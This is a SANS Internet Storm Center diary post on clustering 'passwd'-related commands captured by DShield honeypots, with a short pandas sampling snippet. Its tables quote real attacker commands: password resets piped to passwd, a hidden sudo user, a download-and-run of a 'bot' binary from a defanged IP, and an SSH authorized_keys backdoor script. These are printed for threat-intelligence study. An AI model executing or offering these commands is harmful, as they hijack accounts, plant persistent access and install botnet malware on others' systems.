---
title: Usage of "passwd" Command in DShield Honeypots, (Fri, May 30th)
url: https://isc.sans.edu/diary/rss/31994
source: SANS Internet Storm Center, InfoCON: green
date: 2025-05-31
fetch_date: 2025-10-06T22:28:43.091792
---

# Usage of "passwd" Command in DShield Honeypots, (Fri, May 30th)

# [Internet Storm Center](/)

[Sign In](/login.html)
[Sign Up](/register.html)

Handler on Duty: [Johannes Ullrich](/handler_list.html#johannes-ullrich "Johannes Ullrich")

Threat Level: [green](/infocon.html)

* [previous](/diary/31990)
* [next](/diary/31998)

# [Usage of "passwd" Command in DShield Honeypots](/forums/diary/Usage%2Bof%2Bpasswd%2BCommand%2Bin%2BDShield%2BHoneypots/31994/)

**Published**: 2025-05-30. **Last Updated**: 2025-05-30 00:33:50 UTC
**by** [Jesse La Grew](/handler_list.html#jesse-la-grew) (Version: 1)

[2 comment(s)](/diary/Usage%2Bof%2Bpasswd%2BCommand%2Bin%2BDShield%2BHoneypots/31994/#comments)

DShield honeypots [1] receive different types of attack traffic and the volume of that traffic can change over time. I've been collecting data from a half dozen honeypots for a little over a year to make comparisons. This data includes:

* Cowrie logs [2], which contain SSH and telnet attacks
* Web honeypot logs
* Firewall logs (iptables)
* Packet captures using tcpdump

The highest volume of activity has been for my residentially hosted honeypot.

**![](https://isc.sans.edu/diaryimages/images/2025-05-30_figure1.png)
Figure 1: Cowrie log volume by honeypot starting on 4/21/2024, covering approximately 1 year.**

The data is processed with some python scripts to identity data clusters and outliers [3]. This weekend I learned that there is only so much memory you can throw at a probelm before you need to consider a different strategy for analyzing data. While doing clustering of unique commands submitted to my honeypots, my python script crashed. It left me with a problem on what do to next. One of the options that I had was to try and look at a subset of the command data. But what subset?

Something that was interesting when previously reviewing the data was how many different kinds of password change attempts happened on honeypots. This was one of the reasons that I tried to do clustering in the first place. I wanted to be able to group similar commands, even if there were deviations, such as the username and password attempted for a password change command.

A summary of the data volume for submitted commands ("input" field in Cowrie data):

Unique commands: 536,508
Unique commands with "**`passwd`**" used: 502,846
**Percentage of commands with "passwd" included: 93.73%**

Considering that 94% of the unique commands submitted had something to do with "**`passwd`**", I decided to filter those out, which would allow me to cluster the remaining data without any memory errors. That still left how to review this password data and look for similar clusters. My solution was simply to sort the data alphabetically and take every third value for analysis.

```

# sort pandas dataframe using the "input" column
unique_commands_passwd = unique_commands_passwd.sort_values(by='input')

# take every third value from the dataframe and store it in a new datafame for analysis
unique_commands_passwd_subset = unique_commands_passwd.iloc[::3, :]
```

This allowed me to process the data, but it does have some shortcomings. If there were three adjacent entries that may have been outliers or unique clusters, some of that data would get filtered out. Another option in this case could be to randomly sample the data.

From this clustering process, 17 clusters emerged. Below are examples from each cluster.

| Command | Cluster |
| --- | --- |
| `apt update && apt install sudo curl -y && sudo useradd -m -p $(openssl passwd -1 45ukd2Re) system && sudo usermod -aG sudo system` | 0 |
| `echo "czhou\np2mk0NIg9gRF\np2mk0NIg9gRF\n"|passwd` | 1 |
| `echo "$#@!QWER$#@!REWQFDSAVCXZ\nougti9mT9YAa\nougti9mT9YAa\n"|passwd` | 2 |
| `echo "540df7f83845146f0287ff6d2da77900\nE3oSNKfWpq1s\nE3oSNKfWpq1s\n"|passwd` | 3 |
| `echo "A@0599343813A@0599343813A@0599343813\nymL1D2CvlBlW\nymL1D2CvlBlW\n"|passwd` | 4 |
| `echo "ItsemoemoWashere2023support\nnZsvXDsxcCEm\nnZsvXDsxcCEm\n"|passwd` | 5 |
| `echo "root:ddKCQwpLRc9Q"|chpasswd|bash` | 6 |
| `echo -e "Passw0rd\ndljyjtNPLEwI\ndljyjtNPLEwI"|passwd|bash` | 7 |
| `echo -e "xmrmining@isntprofitable\n7UrX3NlsBj6i\n7UrX3NlsBj6i"|passwd|bash` | 8 |
| `echo -e "540df7f83845146f0287ff6d2da77900\nHB15VQlzOyOo\nHB15VQlzOyOo"|passwd|bash` | 9 |
| `echo -e "A@0599343813A@0599343813A@0599343813\nymL1D2CvlBlW\nymL1D2CvlBlW"|passwd|bash` | 10 |
| `echo -e "ItsemoemoWashere2023support\nnZsvXDsxcCEm\nnZsvXDsxcCEm"|passwd|bash` | 11 |
| `lscpu && echo -e "yNHYAVV3\nyNHYAVV3" | passwd && curl https://ipinfo.io/org --insecure -s && free -h && apt` | 12 |
| `lscpu | grep "CPU(s):                " && echo -e "5XHeUh9gNe76\n5XHeUh9gNe76" | passwd && pkill bin.x86_64; cd /tmp; wget http://45.89.28[.]202/bot; curl -s -O http://45.89.28[.]202/bot; chmod 777 bot; ./bot;` | 13 |
| `lscpu | grep "CPU(s):                " && echo -e "9nz66TbaU9Y8\n9nz66TbaU9Y8" | passwd && pkill bin.x86_64; cd /tmp; wget http://45.89.28[.]202/bot; curl -s -O http://45.89.28[.]202/bot; chmod 777 bot; ./bot; iptables -A INPUT -s 194.50.16[.]26 -j DROP; iptables -A INPUT -s 85.239.34[.]237 -j DROP; iptables -A INPUT -s 186.2.171[.]36 -j DROP` | 14 |
| `lscpu | grep "CPU(s):                " && echo -e "Gr7gWzAzts5y\nGr7gWzAzts5y" | passwd && pkill bin.x86_64; cd /tmp; wget http://45.89.28[.]202/bot; curl -s -O http://45.89.28[.]202/bot; chmod 777 bot; ./bot; iptables -A INPUT -s 194.50.16[.]26 -j DROP; iptables -A INPUT -s 85.239.34.237 -j DROP` | 15 |
| `openssl passwd -1 45ukd2Re` | 16 |

**Figure 2: Sampling of commands with "passwd" used for each cluster identified.**

Some of these could probably be clustered better with different feature selections, but it's still a nice grouping. I was a bit more interested in what the outliers looked like (**`cluster=-1`**).

**![](https://isc.sans.edu/diaryimages/images/2025-05-30_figure2.PNG)
Figure 3: Clustering outliers highlighting some more unique entries.**

| Commands |
| --- |
| `#!/bin/bash  username="local"  version="1.3"`  `if [ "$EUID" -ne 0 ]; then    echo "[-] Run as root!"    exit  fi`  `getent passwd $username > /dev/null  if [ $? -eq 0 ]; then    echo "[-] Username $username is already being used!"    exit  fi`    **<rest of script not included>** |
| `;             arch_info=$(uname -m);             cpu_count=$(nproc);             gpu_count=$(lspci | egrep -i 'nvidia|amd' | grep -e VGA -e 3D | wc -l);             echo -e "YnEGa37O\nYnEGa37O" | passwd > /dev/null 2>&1;             if [[ ! -d "${HOME}/.ssh" ]]; then;                 mkdir -p "${HOME}/.ssh" >/dev/null 2>&1;             fi;             touch "${HOME}/.ssh/authorized_keys" 2>/dev/null;             if [ $? -eq 0 ]; then;                 echo -e "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEAk5YcGjNbxRvJI6KfQNawBc4zXb5Hsbr0qflelvsdtu1MNvQ7M+ladgopaPp/trX4mBgSjqATZ9nNYqn/MEoc80k7eFBh+bRSpoNiR+yip5IeIs9mVHoIpDIP6YexqwQCffCXRIUPkcUOA/x/v3jySnP6HCyjn6QzKILlMl8zB3RKHiw0f14sRESr4SbI/Dp2SokPZxNBJwwa4MUa/hx5bTE/UqNU2+b6b+W+zR9YRl610TFE/mUaFiXgtnmQsrGG6zflB5JjxzWaHl3RRpHhaOe5GdPzf1OhXJv4mCt2VKwcLWIyRQxN3fsrrlCF2Sr3c0SjaYmhAnXtqmednQE+rw== server" > ${HOME}/.ssh/authorized_keys;                 chmod 600 ${HOME}/.ssh/authorized_keys >/dev/null 2>&1;                 chmod 700 ${HOME}/.ssh >/dev/null 2>&1;                 ssh_status="success";             else;                 ssh_status="failed";             fi;             users=$(cat /etc/passwd | grep -v nologin | grep -v /bin/false | grep -v /bin/sync | grep -v /sbin/shutdown | grep -v /sbin/halt | cut -d: -f1 | sort);             echo "$arch_info:$cpu_count:$gpu_count:$users:$ssh_status";` |
| `ps -HewO lstart ex;echo finalshell_separator;ls --color=never -l /proc/*/exe;echo finalshell_separator;cat /etc/passwd;echo finalshell_separator;ip addr;echo finalshell_separator;pwd;echo finalshell_separator;uname -s;uname -n;uname -r;uname -v;uname -m;uname -p;uname -i;uname -o;echo finalshell_separator;cat /etc/system-release;cat /etc/issue;echo finalshell_separator;cat /proc/cpuinfo;echo finalshell_separator;` |

**Figure 4: Comman...